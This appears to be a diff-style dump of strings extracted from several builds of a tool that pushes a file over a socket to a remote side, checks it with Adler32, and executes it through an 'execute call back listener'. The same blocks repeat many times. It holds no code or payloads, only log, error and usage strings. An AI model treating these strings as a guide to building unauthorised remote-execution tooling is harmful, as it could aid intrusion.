+Execute_initializeClientSession: recv() failed
+Execute_connect: socket() failed
+Execute_connect: bind() failed
+Execute_connectlisten() failed
+Execute_connect: Listening %s:%d
+Execute_connect: accept() failed
+Execute_connect: Accepted connection %s:%d
+Execute_connect: Trying %s:%d...
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: recv() failed
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: send() failed
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Executable format error
+Execute_transmit: Execution error: The execl() system call failed: %s (%u).
+EXECUTE_ERROR_UNKNOWN
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_VERIEXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+EXECUTE_ERROR_FCHMOD
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+sleep
+execlp
+exit
+  -h, --help                                - This help message
+help
+sleep
+execlp
+exit
+execute
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--start-ish cannot be specified with --execute
+--execute can only be used with --command 0x04
+Waiting %i seconds to invoke Execute Client...
+Execute_transmit() failed
+help
+Execute_initializeClientSession: recv() failed
+Execute_connect: socket() failed
+Execute_connect: bind() failed
+Execute_connectlisten() failed
+Execute_connect: Listening %s:%d
+Execute_connect: accept() failed
+Execute_connect: Accepted connection %s:%d
+Execute_connect: Trying %s:%d...
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: recv() failed
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: send() failed
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Executable format error
+Execute_transmit: Execution error: The execl() system call failed: %s (%u).
+EXECUTE_ERROR_UNKNOWN
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_VERIEXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+EXECUTE_ERROR_FCHMOD
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+exit
+execlp
+sleep
+execute
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--start-ish cannot be specified with --execute
+--execute can only be used with --command 0x04
+help
+Waiting %i seconds to invoke Execute Client...
+Execute_transmit() failed
+Execute_initializeClientSession: recv() failed
+EXECUTE_ERROR_UNKNOWN
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_VERIEXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+EXECUTE_ERROR_FCHMOD
+Execute_connect: socket() failed
+Execute_connect: bind() failed
+Execute_connectlisten() failed
+Execute_connect: Listening %s:%d
+Execute_connect: accept() failed
+Execute_connect: Accepted connection %s:%d
+Execute_connect: Trying %s:%d...
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: recv() failed
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: send() failed
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Execute_transmit: Execution error: The execl() system call failed: %s (%u).
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+Executable format error
+sleep
+execlp
+exit
+execute
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--start-ish cannot be specified with --execute
+--execute can only be used with --command 0x04
+Waiting %i seconds to invoke Execute Client...
+Execute_transmit() failed
+help
+Execute_initializeClientSession: recv() failed
+Execute_connect: socket() failed
+Execute_connect: bind() failed
+Execute_connectlisten() failed
+Execute_connect: Listening %s:%d
+Execute_connect: accept() failed
+Execute_connect: Accepted connection %s:%d
+Execute_connect: Trying %s:%d...
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: recv() failed
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: send() failed
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Executable format error
+Execute_transmit: Execution error: The execl() system call failed: %s (%u).
+EXECUTE_ERROR_UNKNOWN
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_VERIEXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+EXECUTE_ERROR_FCHMOD
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+sleep
+execlp
+exit
+help
+  -h, --help                                - This help message
+sleep
+execlp
+exit
+execute
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--start-ish cannot be specified with --execute
+--execute can only be used with --command 0x04
+Waiting %i seconds to invoke Execute Client...
+Execute_transmit() failed
+help
+Execute_initializeClientSession: recv() failed
+Execute_connect: socket() failed
+Execute_connect: bind() failed
+Execute_connectlisten() failed
+Execute_connect: Listening %s:%d
+Execute_connect: accept() failed
+Execute_connect: Accepted connection %s:%d
+Execute_connect: Trying %s:%d...
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: recv() failed
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: send() failed
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Executable format error
+Execute_transmit: Execution error: The execl() system call failed: %s (%u).
+EXECUTE_ERROR_UNKNOWN
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_VERIEXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+EXECUTE_ERROR_FCHMOD
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+sleep
+execlp
+exit
+execute
+help
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--execute can only be used with --command 0x04
+--start-ish cannot be specified with --execute
+Waiting 10 seconds to invoke Execute Client...
+Execute_transmit() failed
+Execute_initializeClientSession: recv() failed
+Execute_connect: Trying %s:%d...
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_connect: Listening %s:%d
+Execute_connect: Accepted connection %s:%d
+Execute_transmit: recv() failed
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: send() failed
+Execute_connect: bind() failed
+Execute_connect: socket() failed
+Execute_connectlisten() failed
+Execute_connect: accept() failed
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_UNKNOWN
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_SOCKET
+Execute_transmit: Execution error: The execl() system call failed: %s (%u).
+EXECUTE_ERROR_LISTEN
+Executable format error
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+EXECUTE_ERROR_VERIEXEC
+sleep
+execlp
+exit
+execute
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--start-ish cannot be specified with --execute
+--execute can only be used with --command 0x04
+Waiting 10 seconds to invoke Execute Client...
+Execute_transmit() failed
+help
+Execute_initializeClientSession: recv() failed
+Execute_connect: socket() failed
+Execute_connect: bind() failed
+Execute_connectlisten() failed
+Execute_connect: Listening %s:%d
+Execute_connect: accept() failed
+Execute_connect: Accepted connection %s:%d
+Execute_connect: Trying %s:%d...
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: recv() failed
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: send() failed
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Executable format error
+Execute_transmit: Execution error: The execl() system call failed: %s (%u).
+EXECUTE_ERROR_UNKNOWN
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_VERIEXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+sleep
+execlp
+exit
+help
+  -h, --help                                - This help message
+sleep
+execlp
+exit
+execute
+help
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--execute can only be used with --command 0x04
+--start-ish cannot be specified with --execute
+Waiting 5 seconds to invoke Execute Client...
+Execute_initializeClientSession: recv() failed
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_connect: Listening %s:%d
+Execute_connect: Accepted connection %s:%d
+Execute_transmit: recv() failed
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: send() failed
+Execute_connect: bind() failed
+Execute_connect: socket() failed
+Execute_connectlisten() failed
+Execute_connect: accept() failed
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_UNKNOWN
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_SOCKET
+Execute_transmit: Execution error: The execl() system call failed: %s.
+EXECUTE_ERROR_LISTEN
+Executable format error
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+EXECUTE_ERROR_VERIEXEC
+sleep
+execlp
+exit
+execute
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--start-ish cannot be specified with --execute
+--execute can only be used with --command 0x04
+Waiting %i seconds to invoke Execute Client...
+Execute_transmit() failed
+help
+Execute_initializeClientSession: recv() failed
+Execute_connect: socket() failed
+Execute_connect: bind() failed
+Execute_connectlisten() failed
+Execute_connect: Listening %s:%d
+Execute_connect: accept() failed
+Execute_connect: Accepted connection %s:%d
+Execute_connect: Trying %s:%d...
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: recv() failed
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: send() failed
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Executable format error
+Execute_transmit: Execution error: The execl() system call failed: %s (%u).
+EXECUTE_ERROR_UNKNOWN
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_VERIEXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+EXECUTE_ERROR_FCHMOD
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+sleep
+execlp
+exit
+execute
+help
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--execute can only be used with --command 0x04
+--start-ish cannot be specified with --execute
+Waiting 10 seconds to invoke Execute Client...
+Execute_transmit() failed
+Execute_initializeClientSession: recv() failed
+Execute_connect: Trying %s:%d...
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_connect: Listening %s:%d
+Execute_connect: Accepted connection %s:%d
+Execute_transmit: recv() failed
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: send() failed
+Execute_connect: bind() failed
+Execute_connect: socket() failed
+Execute_connectlisten() failed
+Execute_connect: accept() failed
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_UNKNOWN
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_SOCKET
+Execute_transmit: Execution error: The execl() system call failed: %s.
+EXECUTE_ERROR_LISTEN
+Executable format error
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+EXECUTE_ERROR_VERIEXEC
+usleep
+execlp
+exit
+help
+  -h --help                         - This help message
+sleep
+execlp
+exit
+execute
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--start-ish cannot be specified with --execute
+--execute can only be used with --command 0x04
+Waiting 10 seconds to invoke Execute Client...
+Execute_transmit() failed
+help
+Execute_initializeClientSession: recv() failed
+Execute_connect: socket() failed
+Execute_connect: bind() failed
+Execute_connectlisten() failed
+Execute_connect: Listening %s:%d
+Execute_connect: accept() failed
+Execute_connect: Accepted connection %s:%d
+Execute_connect: Trying %s:%d...
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: recv() failed
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: send() failed
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Executable format error
+Execute_transmit: Execution error: The execl() system call failed: %s.
+EXECUTE_ERROR_UNKNOWN
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_VERIEXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+sleep
+execlp
+exit
+execute
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--start-ish cannot be specified with --execute
+--execute can only be used with --command 0x04
+Waiting %i seconds to invoke Execute Client...
+Execute_transmit() failed
+help
+Execute_initializeClientSession: recv() failed
+Execute_connect: socket() failed
+Execute_connect: bind() failed
+Execute_connectlisten() failed
+Execute_connect: Listening %s:%d
+Execute_connect: accept() failed
+Execute_connect: Accepted connection %s:%d
+Execute_connect: Trying %s:%d...
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: recv() failed
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: send() failed
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Executable format error
+Execute_transmit: Execution error: The execl() system call failed: %s (%u).
+EXECUTE_ERROR_UNKNOWN
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_VERIEXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+EXECUTE_ERROR_FCHMOD
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+sleep
+execlp
+exit
+  -h, --help                                - This help message
+help
+sleep
+execlp
+exit
+execute
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--start-ish cannot be specified with --execute
+--execute can only be used with --command 0x04
+Waiting 10 seconds to invoke Execute Client...
+Execute_transmit() failed
+help
+Execute_initializeClientSession: recv() failed
+Execute_connect: socket() failed
+Execute_connect: bind() failed
+Execute_connectlisten() failed
+Execute_connect: Listening %s:%d
+Execute_connect: accept() failed
+Execute_connect: Accepted connection %s:%d
+Execute_connect: Trying %s:%d...
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: recv() failed
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: send() failed
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Executable format error
+Execute_transmit: Execution error: The execl() system call failed: %s (%u).
+EXECUTE_ERROR_UNKNOWN
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_VERIEXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+sleep
+execlp
+exit
+execute
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--start-ish cannot be specified with --execute
+--execute can only be used with --command 0x04
+Waiting %i seconds to invoke Execute Client...
+Execute_transmit() failed
